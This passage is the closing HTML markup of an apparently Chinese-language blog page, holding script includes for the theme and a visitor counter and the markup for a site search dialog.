src="/js/main.js?v=5.6.0"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.6.0"></script></div></div></body></html>
